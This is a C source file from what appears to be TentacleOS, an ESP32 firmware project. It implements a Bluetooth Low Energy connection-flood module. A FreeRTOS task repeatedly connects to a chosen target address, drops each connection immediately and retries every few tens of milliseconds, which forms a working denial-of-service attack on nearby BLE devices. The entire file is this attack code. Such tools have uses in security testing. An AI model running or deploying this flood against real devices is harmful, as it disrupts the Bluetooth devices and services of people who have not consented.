// Copyright (c) 2025 HIGH CODE LLC
//
// TentacleOS is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// TentacleOS is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with TentacleOS. If not, see <https://www.gnu.org/licenses/>.

#include "ble_connect_flood.h"

#include <string.h>

#include "esp_heap_caps.h"
#include "esp_log.h"
#include "freertos/FreeRTOS.h"
#include "freertos/semphr.h"
#include "freertos/task.h"
#include "sys_prio.h"
#include "host/ble_gap.h"

#include "bluetooth_service.h"

static const char *TAG = "BLE_CONNECT_FLOOD";

#define FLOOD_STACK_SIZE      4096
#define FLOOD_TASK_PRIORITY SYS_PRIO_SERVICE_HI
#define FLOOD_CONNECT_TIMEOUT 5000
#define FLOOD_RETRY_DELAY_MS  100
#define FLOOD_CYCLE_DELAY_MS  20
#define FLOOD_STOP_POLL_MS    50
#define FLOOD_STOP_RETRIES    20

static volatile bool s_is_running = false;
static uint8_t s_target_addr[6];
static uint8_t s_target_addr_type;

static TaskHandle_t s_flood_task_handle = NULL;
static StackType_t *s_flood_task_stack = NULL;
static StaticTask_t *s_flood_task_tcb = NULL;
static SemaphoreHandle_t s_flood_sem = NULL;

static void flood_task(void *pvParameters);

static int flood_gap_event(struct ble_gap_event *event, void *arg) {
  switch (event->type) {
    case BLE_GAP_EVENT_CONNECT:
      if (event->connect.status == 0) {
        ESP_LOGD(TAG, "Connected to target. Terminating...");
        ble_gap_terminate(event->connect.conn_handle, BLE_ERR_REM_USER_CONN_TERM);
      } else {
        ESP_LOGW(TAG, "Connection failed status=%d", event->connect.status);
        if (s_flood_sem != NULL)
          xSemaphoreGive(s_flood_sem);
      }
      break;

    case BLE_GAP_EVENT_DISCONNECT:
      ESP_LOGD(TAG, "Disconnected.");
      if (s_flood_sem != NULL)
        xSemaphoreGive(s_flood_sem);
      break;

    default:
      break;
  }
  return 0;
}

esp_err_t ble_connect_flood_start(const uint8_t *addr, uint8_t addr_type) {
  if (s_is_running) {
    return ESP_ERR_INVALID_STATE;
  }

  if (!bluetooth_service_is_running()) {
    ESP_LOGE(TAG, "Bluetooth service not running");
    return ESP_FAIL;
  }

  memcpy(s_target_addr, addr, 6);
  s_target_addr_type = addr_type;

  if (s_flood_sem == NULL) {
    s_flood_sem = xSemaphoreCreateBinary();
  }

  xSemaphoreTake(s_flood_sem, 0);

  s_flood_task_stack =
      (StackType_t *)heap_caps_malloc(FLOOD_STACK_SIZE * sizeof(StackType_t), MALLOC_CAP_SPIRAM);
  s_flood_task_tcb = (StaticTask_t *)heap_caps_malloc(sizeof(StaticTask_t), MALLOC_CAP_SPIRAM);

  if (s_flood_task_stack == NULL || s_flood_task_tcb == NULL) {
    ESP_LOGE(TAG, "Failed to allocate memory for flood task");
    free(s_flood_task_stack);
    free(s_flood_task_tcb);
    s_flood_task_stack = NULL;
    s_flood_task_tcb = NULL;
    return ESP_ERR_NO_MEM;
  }

  s_is_running = true;
  s_flood_task_handle = xTaskCreateStatic(flood_task,
                                          "ble_flood_task",
                                          FLOOD_STACK_SIZE,
                                          NULL,
                                          FLOOD_TASK_PRIORITY,
                                          s_flood_task_stack,
                                          s_flood_task_tcb);

  if (s_flood_task_handle == NULL) {
    s_is_running = false;
    return ESP_FAIL;
  }

  return ESP_OK;
}

esp_err_t ble_connect_flood_stop(void) {
  if (!s_is_running)
    return ESP_OK;

  s_is_running = false;

  ble_gap_terminate(BLE_HS_CONN_HANDLE_NONE, BLE_ERR_REM_USER_CONN_TERM);

  if (s_flood_sem != NULL) {
    xSemaphoreGive(s_flood_sem);
  }

  int retry = FLOOD_STOP_RETRIES;
  while (s_flood_task_handle != NULL && retry > 0) {
    vTaskDelay(pdMS_TO_TICKS(FLOOD_STOP_POLL_MS));
    retry--;
  }

  if (s_flood_task_stack != NULL) {
    free(s_flood_task_stack);
    s_flood_task_stack = NULL;
  }
  if (s_flood_task_tcb != NULL) {
    free(s_flood_task_tcb);
    s_flood_task_tcb = NULL;
  }

  if (s_flood_sem != NULL) {
    vSemaphoreDelete(s_flood_sem);
    s_flood_sem = NULL;
  }

  ESP_LOGI(TAG, "Flood stopped");
  return ESP_OK;
}

bool ble_connect_flood_is_running(void) {
  return s_is_running;
}

static void flood_task(void *pvParameters) {
  ESP_LOGI(TAG, "Connection Flood Task Started");

  struct ble_gap_conn_params conn_params = {0};
  conn_params.scan_itvl = 0x0010;
  conn_params.scan_window = 0x0010;
  conn_params.itvl_min = BLE_GAP_INITIAL_CONN_ITVL_MIN;
  conn_params.itvl_max = BLE_GAP_INITIAL_CONN_ITVL_MAX;
  conn_params.latency = 0;
  conn_params.supervision_timeout = 0x0100;
  conn_params.min_ce_len = 0x0010;
  conn_params.max_ce_len = 0x0300;

  ble_addr_t addr;
  memcpy(addr.val, s_target_addr, 6);
  addr.type = s_target_addr_type;

  while (s_is_running) {
    bluetooth_service_stop_advertising();

    int rc = ble_gap_connect(bluetooth_service_get_own_addr_type(),
                             &addr,
                             FLOOD_CONNECT_TIMEOUT,
                             &conn_params,
                             flood_gap_event,
                             NULL);

    if (rc == 0) {
      xSemaphoreTake(s_flood_sem, portMAX_DELAY);
    } else if (rc == BLE_HS_EALREADY) {
      vTaskDelay(pdMS_TO_TICKS(FLOOD_RETRY_DELAY_MS));
    } else {
      ESP_LOGE(TAG, "Connect failed: %d", rc);
      vTaskDelay(pdMS_TO_TICKS(FLOOD_RETRY_DELAY_MS));
    }

    vTaskDelay(pdMS_TO_TICKS(FLOOD_CYCLE_DELAY_MS));
  }

  s_flood_task_handle = NULL;
  vTaskDelete(NULL);
}
